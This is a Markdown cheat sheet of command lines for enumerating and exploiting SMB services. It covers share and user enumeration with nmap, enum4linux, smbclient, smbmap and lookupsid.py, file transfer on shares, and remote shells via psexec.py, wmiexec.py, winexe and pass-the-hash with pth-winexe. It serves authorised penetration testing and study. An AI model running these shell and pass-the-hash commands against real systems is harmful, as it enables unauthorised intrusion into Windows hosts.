# Server Message Block _(SMB)_ enumeration and exploitation
* [Initial enumeration](#initial-enumeration)
* [SID enumeration](#sid-enumeration)
* [Connecting to and enumerating an SMB share](#connecting-to-and-enumerating-an-smb-share)
* [Uploading files](#uploading-files)
* [Reverse shells](#reverse-shells)

## Initial enumeration
- Nmap smb-enum scripts _(not comprehensive, consider using other options)_:
```bash
nmap -vv -p 139,445 -sT --script=+smb-enum* <ip>
```
- Nmap All SMB scripts _(usually takes too long)_:
```bash
nmap -vv -p 139,445 -sT --script=+smb* <ip>
```
- `enum4linux` all enumeration:
```bash
enum4linux -a <ip>
```
- List shares:
```bash
smbclient -L <ip>
smbclient -L <ip> -U <username>
```
- List shares with permissions:
```bash
smbmap -H <ip>
smbmap -H <ip> -u 'anonymous'
smbmap -H <ip> -u 'anonymous' -p 'anonymous' 
smbmap -H <ip> -u <username> -p '<password>' 
```

## SID enumeration
- Enumerate users using MSRPC _(requires access to the IPC$ share)_:
```bash
lookupsid.py <ip>
lookupsid.py <user>:<password>@<ip>
```

## Connecting to and enumerating an SMB share
- Connect to a share:
```bash
smbclient //<ip>/<share_name>
smbclient //<ip>/<share_name> -U='anonymous%'
smbclient //<ip>/<share_name> -U='<username>%<password>'
```
- Enumerate files and folders:
```bash
ls
cd <path>
get <filename>
```

## Uploading files
```bash
put <filename>
```

## Reverse shells
```bash
psexec.py '<username>:<password>@<ip>'
wmiexec.py '<username>:<password>@<ip>'
winexe -U '<username>%<password>' //<ip> cmd.exe
pth-winexe -U '<username>%<lm_hash>:<nt_hash>' //<ip> cmd.exe
```
